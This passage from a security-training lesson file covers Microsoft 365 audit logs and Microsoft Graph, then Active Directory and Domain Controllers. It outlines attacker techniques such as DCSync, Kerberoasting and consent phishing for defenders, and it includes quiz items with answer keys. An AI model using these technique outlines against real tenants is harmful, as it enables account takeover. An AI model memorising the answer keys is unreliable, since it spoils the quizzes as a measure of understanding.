    "https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-schema-tables",
    "https://learn.microsoft.com/en-us/kusto/query/best-practices"
  ],
  "xp": 260,
  "estimatedMinutes": 55,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-microsoft-365-and-graph-for-security",
  "slug": "microsoft-365-and-graph-for-security",
  "title": "Microsoft 365 & Microsoft Graph for Security",
  "topic": "Microsoft Security",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "For most organisations, the crown jewels now live in Microsoft 365: the email, the documents, the chats, the identities. That makes M365 both the thing a SOC most needs to protect and one of the richest sources of investigation data available. Underneath the familiar apps sits a single audit trail and a single API — Microsoft Graph — that together let an analyst see and act on almost everything. This lesson explains what Microsoft 365 is and why it is such a target, how the unified audit log records activity across it with real event fields, how Microsoft Graph works as both an automation surface and an attack surface with a worked API example, and how the Graph Security API ties Microsoft's whole security picture together into one automated investigation.",
  "sections": [
    {
      "heading": "What Microsoft 365 Is — and Why It's a Target",
      "content": "**Microsoft 365 (M365)** is Microsoft's cloud productivity suite — the collection of services most organisations run their daily work on. The pieces a SOC cares about most are:\n\n- **Exchange Online** — email and calendars.\n- **SharePoint Online** — document libraries and intranet sites.\n- **OneDrive** — personal cloud file storage.\n- **Microsoft Teams** — chat, meetings, and collaboration.\n- **Microsoft Entra ID** — the identity service that everyone signs into (covered in its own lessons).\n\nBecause a modern company runs on these, M365 is where the valuable data *and* the valuable identities live. That concentration is exactly what makes it a prime target. An attacker who compromises a single M365 account potentially gains the user's email, their files in OneDrive and SharePoint, and their Teams conversations — and can use the trusted account to phish colleagues from the inside.\n\nThe attacks that dominate M365 incidents follow from this:\n\n- **Account takeover** via phishing, password spray, or token theft — the entry point for most of the rest.\n- **Business email compromise (BEC)** — using a real, trusted mailbox to defraud or phish others.\n- **Malicious inbox rules** — an attacker who owns a mailbox often creates a hidden rule to auto-forward or delete mail, maintaining stealthy access to the conversation.\n- **OAuth consent phishing** — tricking a user into granting a malicious app standing access to their mailbox and files (covered in its own lesson).\n- **Data exfiltration** — mass-downloading from SharePoint/OneDrive.\n\nThe defender's problem is that all this activity happens in the cloud, over legitimate protocols, often from a valid (if stolen) session. There are no packets on your wire to inspect. The evidence lives in M365's own records — which is why the **unified audit log** and **Microsoft Graph**, the subjects of the next sections, are the analyst's essential windows into what is really happening across the suite."
    },
    {
      "heading": "The Unified Audit Log — One Trail Across M365",
      "content": "The **unified audit log** is Microsoft 365's single, consolidated record of activity across all its workloads. Rather than hunting through separate logs for Exchange, SharePoint, OneDrive, Teams, and Entra, an analyst can search **one** trail that captures user and admin actions everywhere in the tenant. It is part of Microsoft **Purview** and is the backbone of most M365 investigations.\n\n### What it records\n\nNearly every meaningful action becomes an audit event: a user signing in, reading or sharing a file, sending mail, creating an inbox rule, an admin changing a permission, a mailbox being accessed by someone other than its owner. Each event captures the familiar journalistic fields — **who** (the user or app), **what** (the operation), **when** (a UTC timestamp), **where from** (the client IP), and the **target** the action touched. A simplified record for a suspicious inbox rule looks like this:\n\n```\n{\n  \"CreationTime\": \"2026-08-14T13:04:22\",\n  \"Id\": \"7ce1a2b0-...\",\n  \"Operation\": \"New-InboxRule\",\n  \"RecordType\": \"ExchangeAdmin\",\n  \"ResultStatus\": \"Success\",\n  \"UserId\": \"r.katz@contoso.com\",\n  \"ClientIP\": \"185.203.118.44\",\n  \"Parameters\": [\n    { \"Name\": \"Name\", \"Value\": \"Archive\" },\n    { \"Name\": \"ForwardTo\", \"Value\": \"r.k.backup92@outlook.com\" },\n    { \"Name\": \"DeleteMessage\", \"Value\": \"True\" }\n  ]\n}\n```\n\nOn its own, `New-InboxRule` is ordinary — plenty of users create rules to organise their inbox. What makes this event worth investigating is the *combination*: a rule named blandly (\"Archive\") that silently **forwards mail to an external address** and **deletes the message** afterward, created from a **ClientIP** that does not match the user's normal location. None of those facts alone proves compromise, but together they are the classic fingerprint of an attacker maintaining stealthy access to a hijacked mailbox.\n\n### Operations an analyst hunts for\n\n- **New-InboxRule / Set-InboxRule** — creation or modification of mail rules, a top signal of a compromised mailbox.\n- **Add-MailboxPermission** — someone reading a mailbox that is not theirs.\n- **File and sharing operations** in SharePoint/OneDrive — mass access or external sharing that can indicate exfiltration.\n- **Consent to application / Add service principal** — the fingerprints of OAuth consent phishing.\n- **UserLoggedIn and sign-in anomalies** — correlated with Entra sign-in logs for impossible travel and risky sign-ins.\n\n### Two practical cautions\n\nFirst, **audit logging must be enabled and retained** — the depth and length of retention depend on licensing, and if the data was not captured before an incident, it is not there afterward. Confirming audit coverage is part of readiness. Second, the unified audit log is broad but has its own schema and quirks; for high-volume endpoint or email *behavioural* detail, analysts also use Advanced Hunting. The two are complementary: the unified audit log is the wide, tenant-spanning record of *actions taken*, and it is usually the first place to reconstruct what a compromised M365 account did."
    },
    {
      "heading": "Microsoft Graph — One API for Everything",
      "content": "**Microsoft Graph** is the single, unified API (application programming interface — a defined way for software to ask another system to do something or return data, without a human clicking through a screen) that provides programmatic access to almost all of Microsoft 365. If the console is how a human clicks through M365, Graph is how *code* reads and changes it. Its single endpoint, `graph.microsoft.com`, reaches mail, files, calendars, users, groups, devices, and security data alike.\n\n**Why this matters to a SOC** cuts two ways, and an analyst must hold both.\n\n### Graph is a powerful tool for defenders\n\nBecause one API reaches everything, you can automate investigation and response: pull a user's recent sign-ins, list the inbox rules on a mailbox, enumerate the apps a user has consented to, gather the files shared externally — all programmatically, and all consistently. A request to check a user's mailbox rules through Graph looks like this:\n\n```\nGET https://graph.microsoft.com/v1.0/users/r.katz@contoso.com/mailFolders/inbox/messageRules\nAuthorization: Bearer <access token>\n```\n\nAnd a typical response might reveal exactly the rule the audit log flagged in the previous section:\n\n```\n{\n  \"value\": [\n    {\n      \"displayName\": \"Archive\",\n      \"isEnabled\": true,\n      \"actions\": {\n        \"forwardTo\": [ { \"emailAddress\": { \"address\": \"r.k.backup92@outlook.com\" } } ],\n        \"delete\": true\n      }\n    }\n  ]\n}\n```\n\nSecurity tooling, SOAR playbooks, and analyst scripts lean on calls exactly like this to gather evidence and take action — such as immediately calling `DELETE` on that same rule endpoint to remove it — far faster than clicking through the admin portal by hand.\n\n### Graph is also a target and a technique for attackers\n\nThe same reach that helps defenders helps intruders. This is the deep connection to **OAuth consent phishing**: when an attacker tricks a user into consenting to a malicious app, the permissions that app requests — `Mail.Read`, `Files.Read.All`, `offline_access` — are **Graph permissions (scopes)**. The malicious app then calls Microsoft Graph to read the victim's mail and files, using tokens rather than a password. So understanding Graph is understanding *what* a consented app can actually do to a mailbox.\n\n### Permissions and identity\n\nGraph access is governed by **scopes** (the specific permissions granted, like `User.Read` or `Mail.ReadWrite`) and by whether an app acts as a signed-in user (**delegated** permissions, limited to what that user could do themselves) or on its own (**application** permissions, which can act tenant-wide without a signed-in user present and are consequently more dangerous if abused). For an analyst, reviewing which apps hold which Graph permissions in a tenant is a core hunting task — an unfamiliar app with broad, application-level mail and file scopes is exactly the artefact left behind by a consent-phishing attack."
    },
    {
      "heading": "The Graph Security API and Pulling It Together",
      "content": "Beyond reaching mail and files, Microsoft Graph exposes a dedicated **Graph Security API** that unifies *security* data and actions across Microsoft's products and partners. It is the programmatic counterpart to the Defender portal: a single, normalised way to read and manage security signals.\n\n**What it provides:**\n\n- **Unified alerts and incidents** — a common schema for security alerts (and incidents) drawn from Microsoft Defender products and integrated third parties, so tools can consume them consistently rather than learning each product's format. A request like `GET https://graph.microsoft.com/v1.0/security/incidents` returns incidents in this shared shape, whether they originated in MDE, MDO, MDI, or a connected partner product.\n- **A path to automation and orchestration** — SIEM and SOAR platforms use the Security API to ingest alerts, enrich them, and drive response, making it a backbone for integrating M365 security into a broader SOC.\n- **Related security data** — such as secure-score information and threat intelligence indicators, reachable through the same API surface.\n\n**How the pieces fit together** is the real takeaway of this lesson. Picture a single M365 account-takeover investigation, in order:\n\n1. An **Entra sign-in** risk (impossible travel) and an **MDO** phishing alert surface in the **Defender portal**, correlated into one **incident** — this is the alert-and-incident model from the Defender XDR lesson.\n2. You reconstruct what the attacker did using the **unified audit log** — the sign-in, the files touched, and the malicious `New-InboxRule` event shown in this lesson, created to forward and delete mail for persistence.\n3. You check the mailbox with a Graph call and discover the attacker also used **OAuth consent** to grant a rogue app **Graph** permissions, giving it standing mailbox access independent of the password.\n4. Your automation, built on the **Graph Security API** and Graph itself, pulls the evidence together and can execute response — revoke the app's consent and tokens, delete the inbox rule via the same `messageRules` endpoint shown above, and force a password reset.\n\nThat single storyline touches every topic in this lesson — M365 as the target, the unified audit log as the record, Graph as the access surface, and the Graph Security API as the connective automation layer — and shows why they are taught together. For an analyst in a Microsoft environment, fluency here is what turns a scatter of portals and logs into one coherent, actionable picture of an attack, and it is the natural companion to the Advanced Hunting and Defender XDR lessons: the audit log and Graph tell you what happened in M365 itself, while Advanced Hunting and the incident graph tell you what happened on the endpoint and identity side of the same attack."
    }
  ],
  "keyTakeaways": [
    "Microsoft 365 (Exchange, SharePoint, OneDrive, Teams, plus Entra ID) holds an organisation's data and identities, making it a prime target for account takeover, BEC, malicious inbox rules, OAuth consent phishing, and data exfiltration — all happening in the cloud with no packets to inspect.",
    "The unified audit log (part of Purview) is M365's single trail of who/what/when/where across all workloads; a New-InboxRule event with an external ForwardTo address, DeleteMessage:true, and an unfamiliar ClientIP together — not any single field alone — is the classic fingerprint of a hijacked mailbox.",
    "Microsoft Graph is the one API (graph.microsoft.com) reaching all of M365; it is both a defender's automation surface (querying and deleting a malicious inbox rule programmatically) and an attacker's access surface — the Mail.Read/Files.Read.All/offline_access scopes in OAuth consent phishing are Graph permissions a malicious app uses to read mail and files via tokens.",
    "Delegated Graph permissions are limited to what the signed-in user could do themselves, while application permissions can act tenant-wide without a user present and are more dangerous if a malicious app obtains them — reviewing app-held Graph scopes is a core hunting task.",
    "The Graph Security API unifies alerts/incidents and drives SIEM/SOAR automation; a single M365 takeover investigation ties it all together — Defender incident, unified-audit-log reconstruction, a rogue Graph-consented app, and Graph-based response (revoke consent/tokens, remove rule, reset)."
  ],
  "quiz": [
    {
      "question": "During an M365 account-takeover investigation, which data source is the best first place to reconstruct what the compromised user's account actually did across email, files, and settings — for example, discovering a malicious inbox rule left for persistence?",
      "options": [
        {
          "label": "The DeviceRegistryEvents table, because M365 mailbox rules and file shares are stored as Windows registry keys on the user's endpoint device.",
          "value": "a"
        },
        {
          "label": "The Microsoft 365 unified audit log, because it is the single trail of who did what across Exchange, SharePoint, OneDrive, and Teams, including inbox-rule creation.",
          "value": "b"
        },
        {
          "label": "The AWS CloudTrail log, because it records the management-plane API calls for all Microsoft 365 workloads in the organisation's tenant.",
          "value": "c"
        },
        {
          "label": "The Safe Attachments detonation report, because sandbox analysis of email attachments also lists every inbox rule and file-sharing action the account performed.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "The unified audit log is M365's consolidated record of user and admin actions across all workloads, capturing operations like New-InboxRule, so it is the natural first place to reconstruct what a compromised account did. Option a is wrong because M365 cloud actions are not stored as endpoint registry keys. Option c is wrong because CloudTrail is AWS, not Microsoft 365. Option d misdescribes Safe Attachments, which detonates files and does not log inbox rules or sharing actions."
    },
    {
      "question": "In an OAuth consent phishing attack, a victim is tricked into approving a malicious app that requests Mail.Read, Files.Read.All, and offline_access. What is the connection to Microsoft Graph, and why does it make the attack dangerous?",
      "options": [
        {
          "label": "Those are Microsoft Graph permission scopes, so the app calls Graph with tokens to read the victim's mail and files without needing the password, surviving a reset.",
          "value": "a"
        },
        {
          "label": "Those permissions apply only to the attacker's own tenant, so Microsoft Graph prevents the app from ever reaching the victim's mailbox or stored files.",
          "value": "b"
        },
        {
          "label": "Microsoft Graph is unrelated to email, so the requested scopes can only affect the victim's calendar availability and never their actual mail or documents.",
          "value": "c"
        },
        {
          "label": "The scopes force the victim to re-enter their password on every Graph call, which is why the attack is easily detected and blocked by standard MFA prompts.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "Mail.Read, Files.Read.All, and offline_access are Microsoft Graph permission scopes, so the consented app calls graph.microsoft.com with tokens to read the victim's mail and files without the password — and because it uses tokens, the access survives a password reset. Option b is wrong because the granted scopes apply to the victim's data. Option c falsely claims Graph is unrelated to email. Option d is wrong because token-based Graph access does not re-prompt for a password or MFA."
    },
    {
      "question": "An unfamiliar app in the tenant holds an application-level (not delegated) Mail.Read Graph permission. Why is this generally more concerning than the same permission granted as a delegated scope?",
      "options": [
        {
          "label": "Application permissions can act tenant-wide without any signed-in user present, unlike delegated permissions which are limited to what that one signed-in user could do.",
          "value": "a"
        },
        {
          "label": "Application permissions are always automatically revoked after 24 hours, so the real concern is only delegated scopes which can persist indefinitely once granted.",
          "value": "b"
        },
        {
          "label": "There is no practical difference between application and delegated permissions in Microsoft Graph; both grant identical single-user access regardless of configuration.",
          "value": "c"
        },
        {
          "label": "Application permissions only work inside Microsoft Teams chats, so a Mail.Read application permission cannot actually be used to read any mailbox content.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "Application permissions let an app act on its own, without a signed-in user, and can reach broadly across the tenant rather than being limited to one user's own access — which is why an unfamiliar app holding one is a higher-risk finding than the same scope held as a delegated permission. Option b invents an automatic 24-hour revocation that does not exist. Option c is false; the two permission types behave very differently. Option d incorrectly restricts application permissions to Teams only."
    }
  ],
  "references": [
    "https://learn.microsoft.com/en-us/purview/audit-solutions-overview",
    "https://learn.microsoft.com/en-us/graph/overview",
    "https://learn.microsoft.com/en-us/graph/security-concept-overview",
    "https://learn.microsoft.com/en-us/graph/permissions-overview",
    "https://learn.microsoft.com/en-us/graph/api/resources/security-api-overview"
  ],
  "xp": 240,
  "estimatedMinutes": 48,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-active-directory-and-domain-controllers",
  "slug": "active-directory-and-domain-controllers-explained",
  "title": "Active Directory & Domain Controllers: The Complete Foundation",
  "topic": "Active Directory",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "Walk into almost any organisation running Windows and you will find Active Directory at its centre. It decides who every employee is, what they are allowed to touch, and which computer belongs to whom — for tens of thousands of people at once. And running that entire system is a special kind of server called the Domain Controller. This lesson assumes you have never touched Active Directory before and builds the whole picture from zero: what a directory service even is, what a Domain Controller does, how the structure and objects fit together, the protocols that make it work, a step-by-step worked example of what actually happens when someone logs in, and why it is the single most valuable target in most enterprises. For a SOC analyst this is not optional background knowledge — nearly every serious intrusion ends with an attacker trying to own it, and every Windows Security Event ID you will ever triage traces back to one of the mechanisms in this lesson.",
  "sections": [
    {
      "heading": "What Active Directory Is",
      "content": "**Active Directory (AD)** is Microsoft's **directory service**: a central database that stores information about every user, computer, group, and resource in an organisation, and that handles logging people in and deciding what they can access. If a company has 5,000 employees and 3,000 computers, Active Directory is the one system that knows all of them, holds everyone's account, and answers the question \"is this person who they claim to be, and are they allowed to do this?\"\n\nThe cleanest real-life analogy is a **giant, secure company directory combined with a master key system**. A phone directory lists everyone in the organisation with their details; Active Directory does that for digital identities, but it also *controls the locks* — it decides which keys (permissions) each person holds and checks their identity every time they try to open a door.\n\nActive Directory does three big jobs, and holding these apart makes everything else clearer:\n\n- **Authentication** — proving *who you are*. When you log into your work laptop with your username and password, Active Directory verifies you.\n- **Authorization** — deciding *what you can do*. Once it knows who you are, AD (together with the resources you reach) determines which files, servers, and applications you may use, based on your group memberships.\n- **Directory / management** — being the *single source of truth*. It stores all the accounts and settings centrally, so an admin can create one account, reset one password, or disable one user, and it takes effect everywhere at once.\n\nThat last point is why organisations love AD and why attackers covet it. **Centralisation is powerful in both directions.** For administrators, one place to manage everyone is enormously efficient. For an attacker, that same one place, if compromised, is the keys to the entire kingdom — control Active Directory and you potentially control every account and every computer that trusts it. The rest of this lesson unpacks how that central system is built and run, starting with the server that actually holds it: the Domain Controller."
    },
    {
      "heading": "The Domain Controller — the Server That Runs AD",
      "content": "A **Domain Controller (DC)** is a server that runs Active Directory and does the actual work of authenticating users and answering directory requests. Active Directory is the *service and database*; the Domain Controller is the *machine that hosts and runs it*. When people say \"the DC,\" they mean the beating heart of the Windows network.\n\n**What a Domain Controller does, minute to minute:**\n\n- **Authenticates logons.** Every time a user or computer signs into the domain, a Domain Controller verifies the credentials. It hosts the **Kerberos KDC** (Key Distribution Center), the service that issues the tickets used for authentication.\n- **Answers directory queries.** Applications and computers constantly ask the DC questions — \"what groups is this user in?\", \"where is this printer?\" — over the directory protocol LDAP.\n- **Enforces policy.** It distributes the security and configuration rules (Group Policy) that govern users and machines.\n- **Holds the database.** Every DC stores a copy of the AD database in a file called **`NTDS.dit`**.\n\nThat database file deserves special attention, because it is why the DC is the ultimate prize. **`NTDS.dit` contains every object in the domain — and critically, the password hashes of every account, including the administrators.** An attacker who can read this file, or trick a DC into handing over its contents, effectively obtains the credentials to the entire organisation. This is exactly what attacks like **DCSync** and **NTDS dumping** aim for, and it is why \"compromise a Domain Controller\" is functionally the same as \"compromise the whole domain.\"\n\nOrganisations run **more than one Domain Controller** for reliability — if one fails, others keep authenticating users — and the DCs keep each other's copies of the database in sync through **replication** (covered later). A DC also shares a special folder called **SYSVOL** over the network, which holds Group Policy files that every domain computer reads.\n\nThe security takeaway is stark and worth memorising: **the Domain Controller is Tier 0** — the most privileged, most protected asset class in the environment. Anything that can run code on a DC, or that holds Domain Admin rights, can rewrite the rules for everyone. Protecting DCs, and watching everything that touches them, is central SOC work."
    },
    {
      "heading": "The Structure — Domains, Trees, Forests, and OUs",
      "content": "Active Directory is organised into a deliberate hierarchy, and learning the four building blocks lets you read how any Windows environment is laid out.\n\n### Domain\n\nA **domain** is the core administrative and security grouping — a collection of users, computers, and resources that share one Active Directory database and one set of policies, identified by a name like `corp.example.com`. Most small and mid-size organisations are a single domain. Think of it as one self-contained community with its own membership list and rules.\n\n### Tree\n\nA **tree** is one or more domains that share a contiguous naming space — for example `example.com` with a child domain `sales.example.com` beneath it. Trees model organisations that want related but separately managed sub-domains.\n\n### Forest\n\nA **forest** is the outermost container: one or more trees that share a common schema (the definition of what object types exist), configuration, and a global catalog. Crucially, **the forest — not the domain — is the real security boundary of Active Directory.** Everything inside a forest implicitly trusts everything else in it at a deep level, so from a defender's viewpoint the forest is the unit you must consider compromised together. Large enterprises may run multiple domains in one forest, or even multiple forests connected by trusts.\n\n### Organisational Unit (OU)\n\nInside a domain, **OUs** are containers used to organise objects and apply management to them. An OU might hold all the accounts in the Finance department, or all the laptops in the London office. OUs matter for two practical reasons: **Group Policy** is applied to OUs (so you can push settings to just the machines in one OU), and **administrative control can be delegated** at the OU level (letting a regional admin manage only their own OU).\n\n| Level | What it is | Analogy |\n|-------|-----------|---------|\n| Forest | The whole environment; the security boundary | The entire corporation |\n| Tree | Domains sharing a namespace | A division and its sub-divisions |\n| Domain | One database + policy set | A single company site |\n| OU | A container inside a domain | A department or office folder |\n\nSeeing the whole hierarchy laid out as a tree diagram makes the nesting concrete — this is what a mid-size company's Active Directory might actually look like:\n\n```\nForest: example.com\n|\n+-- Tree: example.com\n|   +-- Domain: example.com\n|   |   +-- OU: Finance\n|   |   |   +-- User: j.smith\n|   |   |   +-- User: k.patel\n|   |   |   +-- Computer: FIN-LAPTOP07\n|   |   +-- OU: IT\n|   |   |   +-- User: a.cohen (member of Domain Admins)\n|   |   |   +-- Group: Domain Admins\n|   |   +-- OU: London-Office\n|   |       +-- Computer: LON-WKS12\n|   |\n|   +-- Domain: sales.example.com   (child domain, same tree)\n|       +-- OU: Sales-EU\n|\n+-- Tree: partnerbrand.com   (different namespace, same forest)\n    +-- Domain: partnerbrand.com\n```\n\nEvery user, computer, and group in that diagram is an **object** stored in the AD database, sitting inside an OU, inside a domain, inside a tree, inside the forest. For a SOC analyst, this structure is not trivia — it tells you the **blast radius**: because the forest is the trust boundary, a Domain Admin in one domain can often be leveraged toward Enterprise Admin across the whole forest, and an attacker who owns any domain's DC has a path to the rest. Knowing whether you face one domain or a multi-domain forest shapes how far you assume an intrusion can reach."
    },
    {
      "heading": "The Objects Inside — Users, Groups, Computers, and SIDs",
      "content": "Active Directory is a database, and the records it holds are called **objects**. Four kinds matter most to an analyst.\n\n### Users\n\nA **user object** is a person's account: their username, password (stored as a hash), group memberships, and attributes. There are also **service accounts** — user objects used by applications and services rather than people. Service accounts are a favourite attacker target because they often have strong privileges and passwords that rarely change (the weakness behind **Kerberoasting**).\n\n### Computers\n\nEvery machine joined to the domain has a **computer object** and its own account, which is how the computer itself authenticates to the domain.\n\n### Groups\n\nA **group** bundles users (or computers) together so permissions can be granted to many accounts at once. Instead of giving 200 people access to a share individually, you put them in a group and grant the group. Groups come in two types — **security groups** (used to assign permissions) and **distribution groups** (used only for email lists) — and have different **scopes** (domain-local, global, universal) that control where they can be used.\n\nSome groups are extraordinarily powerful, and every analyst must know them by name:\n\n- **Domain Admins** — full control over the domain. Membership here is effectively the keys to that domain.\n- **Enterprise Admins** — control across the entire forest.\n- **Administrators** and **Schema Admins** — other highly privileged groups.\n\nBecause these groups are so powerful, **any change to their membership is a high-value security event.** An account being added to Domain Admins (Windows Event **4728/4732**) is one of the first things an attacker does after gaining a foothold, and one of the first things a SOC should alert on.\n\n### SIDs\n\nEvery object has a unique identifier called a **SID (Security Identifier)** — a string that Windows actually uses internally to identify accounts (the human-readable name is just for us). Breaking one down piece by piece shows why it matters:\n\n```\nSID: S-1-5-21-3623811015-3361044348-30300820-512\n\nS-1        = SID revision level\n5          = Identifier authority (NT Authority)\n21-...-...-... = Domain identifier (unique to this specific domain)\n512        = RID (Relative Identifier) -> this SID is Domain Admins\n\nOther well-known RIDs to recognise instantly:\n...-500  = the built-in Administrator account\n...-512  = Domain Admins group\n...-519  = Enterprise Admins group\n...-1000+ = ordinary user/group accounts, assigned sequentially as created\n```\n\nUnderstanding SIDs matters because attacks like **Golden Tickets** forge them and **SID History** abuse hides privilege inside them — so when you read AD logs, you are often reading SIDs, and recognising the privileged ones (ending in `-500`, `-512`, `-519`) tells you instantly how serious an event is, even before you look up the friendly account name."
    },
    {
      "heading": "How It All Works — LDAP, Kerberos, GPO, and Replication",
      "content": "Active Directory is made of moving parts that communicate over specific protocols. You do not need to implement them, but recognising each — and its port — lets you read what a Windows network is doing.\n\n### LDAP — asking the directory questions\n\n**LDAP (Lightweight Directory Access Protocol)** is how computers and applications *query and update* Active Directory: \"list the members of this group,\" \"find this user's email.\" It runs on **port 389** (or **636** for the encrypted version). LDAP is also how attackers *enumerate* AD — tools like **BloodHound** issue LDAP queries to map every user, group, and permission relationship, hunting for a path to Domain Admin.\n\n### Kerberos — proving identity\n\n**Kerberos** (port **88**) is the default authentication protocol. When you log in, a Domain Controller's KDC issues you a **ticket-granting ticket**, which you then exchange for tickets to specific services. (Its counterpart, the older **NTLM**, is the fallback.) Kerberos is why Domain Controllers are so central — they *are* the ticket authority — and it is the mechanism abused by **Kerberoasting**, **Pass-the-Ticket**, and **Golden Ticket** attacks. The next section walks through exactly what this exchange looks like end to end.\n\n### DNS — finding the Domain Controllers\n\nActive Directory depends completely on **DNS**. Clients locate their Domain Controllers by looking up special DNS **SRV records**. If DNS is broken, AD stops working — which is why DCs usually run DNS themselves.\n\n### Group Policy (GPO) — pushing rules everywhere\n\nA **Group Policy Object (GPO)** is a bundle of configuration and security settings — password rules, software restrictions, drive mappings — that AD applies automatically to the users and computers in the OUs it is linked to. GPO files live in the DC's **SYSVOL** share and are pulled by every domain machine at logon and periodic refresh. GPO is a double-edged sword: it is how admins enforce security at scale, and it is a powerful attacker tool, because someone who can edit a widely-linked GPO can push malicious settings or code to thousands of machines at once.\n\n### Replication — keeping the DCs in sync\n\nBecause an organisation runs multiple Domain Controllers, they must agree on the data. **Replication** is the automatic process by which every DC copies changes to the others, so a password changed on one DC is known to all of them within minutes. AD uses **multi-master** replication (a change can be made on any DC), which is great for resilience — but it is also what the **DCSync** attack impersonates, pretending to be a DC asking for replication data in order to steal password hashes without ever touching `NTDS.dit` directly.\n\nSeen together, these protocols are the anatomy of the Windows network: LDAP is how you ask, Kerberos is how you prove yourself, DNS is how you find the DCs, GPO is how rules are enforced, and replication is how the DCs stay consistent. Nearly every AD attack is an abuse of one of these normal mechanisms."
    },
    {
      "heading": "Worked Example: What Actually Happens When You Log In",
      "content": "All of the protocols above are abstract until you follow one real logon step by step. Suppose an employee, `j.smith`, sits down at `WORKSTATION01`, types their password, and then opens a folder on `FILESERVER01`. Here is the conversation that actually happens behind the scenes, in order:\n\n```\n1. User types password on WORKSTATION01.\n\n2. WORKSTATION01 -> DC:  AS-REQ  (\"I am j.smith, prove I know my password\")\n     DC logs: Event 4768 (a Kerberos TGT was requested)\n\n3. DC -> WORKSTATION01:  AS-REP  (\"Here is your Ticket-Granting Ticket (TGT), valid 10 hours\")\n\n4. User opens a folder on FILESERVER01.\n\n5. WORKSTATION01 -> DC:  TGS-REQ  (\"Here is my TGT, I want a ticket for FILESERVER01\")\n     DC logs: Event 4769 (a Kerberos service ticket was requested)\n\n6. DC -> WORKSTATION01:  TGS-REP  (\"Here is your service ticket for FILESERVER01\")\n\n7. WORKSTATION01 -> FILESERVER01:  presents the service ticket\n\n8. FILESERVER01 grants or denies access based on j.smith's group memberships\n```\n\nNotice the two-step pattern: first you prove your identity *once* to the DC and receive a TGT (steps 2-3), then you use that TGT to request a separate, narrow ticket for *each* service you want to reach (steps 5-6) without typing your password again. This is why Kerberos is called a **ticket-based** system — the DC never has to re-verify your password for every single resource, which is both efficient and why Domain Controllers can serve enormous organisations without becoming a bottleneck.\n\nThis worked flow also explains exactly why **Event 4769 is the Kerberoasting detection**, referenced earlier in this lesson. In normal use, a person requests service tickets for the handful of resources they actually touch during a workday — a file server here, a mail server there — generating a modest, spread-out trickle of 4769 events tied to real user activity. **Kerberoasting** abuses step 5 directly: an attacker who already has *any* valid domain account requests service tickets for many **service accounts** in rapid succession (because service accounts' tickets are encrypted with the service account's own password hash), then takes those tickets offline and tries to crack the password hash with no further contact with the DC. The result is a burst of 4769 events, often for accounts that single ordinary user has no business touching, all within seconds of each other — a shape that stands out sharply against the slow, request-as-you-go pattern of a real workday, once you know what normal Kerberos traffic looks like."
    },
    {
      "heading": "Why AD Is the Crown Jewel — the SOC Angle",
      "content": "Now the pieces come together into the single most important idea for a defender: **in a Windows enterprise, Active Directory is the crown jewel, and the Domain Controller is where the crown is kept.** Almost every significant intrusion — ransomware, espionage, insider abuse — converges on the same goal: gain control of Active Directory, because that grants control of everything that trusts it. Understanding AD is therefore not a Windows-admin nicety; it is the map of where attackers are trying to go.\n\n**The attacker's journey through AD** follows a recognisable arc, and each stage has a detection:\n\n1. **Initial foothold** on some ordinary workstation (often via phishing).\n2. **Enumeration** — mapping the domain with LDAP-based tools like BloodHound to find a path to privilege.\n3. **Credential theft and escalation** — Kerberoasting service accounts, dumping credentials, Pass-the-Hash — to climb toward Domain Admin.\n4. **Domain dominance** — reaching a Domain Controller and extracting `NTDS.dit` (or performing DCSync) to obtain every credential, and establishing durable persistence like a Golden Ticket.\n\n**The events a SOC watches** map onto this journey. A short set of Windows Security Event IDs carries most of the signal:\n\n- **4624 / 4625** — successful / failed logons.\n- **4768 / 4769** — Kerberos ticket-granting-ticket and service-ticket requests (spikes of 4769 suggest Kerberoasting, as walked through above).\n- **4776** — NTLM authentication validation (spikes suggest brute force or Pass-the-Hash).\n- **4720** — a user account was created.\n- **4728 / 4732** — a member was added to a privileged (global / local) group, such as Domain Admins.\n- **4662 / 5136** — directory object access and modification (used to spot DCSync and tampering).\n\n**The defensive model** built on this understanding is **tiering**: classify assets by privilege, with **Tier 0** being the Domain Controllers, Domain Admin accounts, and anything that can control them. The cardinal rule is to never let Tier 0 credentials be exposed on lower-tier machines, because an attacker who steals a Domain Admin's hash from an ordinary laptop has just skipped the entire journey above. Alongside tiering, defenders protect DCs fiercely, alert on privileged-group changes and DC-targeting activity, and deploy tools like **Microsoft Defender for Identity (MDI)** that watch AD specifically for these techniques.\n\nThe one sentence to carry out of this lesson: **whoever controls the Domain Controller controls the domain — so a SOC's job is to make reaching it as hard, and as loud, as possible.** Everything you will learn about specific AD attacks builds on this foundation of what Active Directory is and why it sits at the centre of the fight."
    }
  ],
  "keyTakeaways": [
    "Active Directory is Microsoft's directory service — the central database and system that authenticates users, authorizes access, and manages all accounts/computers/resources; its centralisation is powerful for admins and, if compromised, for attackers.",
    "A Domain Controller (DC) is the server that runs AD, hosts the Kerberos KDC, and stores the AD database NTDS.dit — which holds every account's password hash, making a DC compromise equivalent to owning the whole domain (Tier 0).",
    "AD is structured as forest > tree > domain > OU (the forest, not the domain, is the security/trust boundary), and holds objects — users, service accounts, computers, groups (Domain Admins/Enterprise Admins are the crown-jewel groups), each with a unique SID whose RID marks privilege (e.g. -512 Domain Admins, -500 Administrator).",
    "A logon is a two-step Kerberos exchange — a TGT from the DC (Event 4768), then a service ticket per resource (Event 4769) — and Kerberoasting abuses that second step by requesting many service-account tickets in a rapid burst instead of the normal slow trickle.",
    "AD runs on LDAP (389/636 queries, abused by BloodHound), Kerberos (88 auth), DNS (SRV records locate DCs), GPO (policy pushed via SYSVOL), and multi-master replication (impersonated by DCSync); SOC defence centres on tiering (never expose Tier 0 creds), protecting DCs, and alerting on key events (4624/4625, 4768/4769, 4776, 4720, 4728/4732, 4662/5136)."
  ],
  "quiz": [
    {
      "question": "An attacker gains the ability to read the NTDS.dit file from a Domain Controller. Why is this considered a full domain compromise, and what makes the Domain Controller such a high-value target?",
      "options": [
        {
          "label": "It is not serious, because NTDS.dit only stores printer and network-share locations, so the attacker gains nothing beyond a directory of office resources.",
          "value": "a"
        },
        {
          "label": "NTDS.dit contains every object in the domain including all account password hashes, so reading it hands the attacker credentials to the entire organisation.",
